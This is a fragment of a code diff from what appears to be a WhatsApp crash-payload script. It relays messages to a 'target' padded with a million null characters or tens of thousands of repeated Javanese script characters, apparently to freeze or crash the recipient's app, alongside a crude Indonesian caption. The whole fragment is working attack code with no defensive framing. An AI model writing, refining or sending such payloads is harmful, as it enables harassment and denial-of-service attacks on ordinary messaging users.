-                                version: 3,
-                                name: "call_permission_request",
-                                paramsJson: "\u0000".repeat(1045000)
-                            },
-                            body: {
-                                text: "Ewe Bang Enak",
-                                format: "DEFAULT"
-                            }
-                        }
-                    }
-                }
+        });
+        
+        await relay({
+            newsletterAdminInviteMessage: {
+                newsletterJid: "120363200000000000@newsletter",
+                newsletterName: "ꦾ" + "ꦽ".repeat(50000),
+                caption: "ꦾ".repeat(30000)
             }
-        }
-    });
+        });
 
-    const msg = await generateWAMessageFromContent(target, Silent, { userJid: target });
-    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
+        await sock.sendMessage(target, { text: "hallo kak" + "ꦽ".repeat(3000) });
+
+    } catch (e) {
+        console.error("Relay Error:", e);
+    }
 }
 
 // Error handling
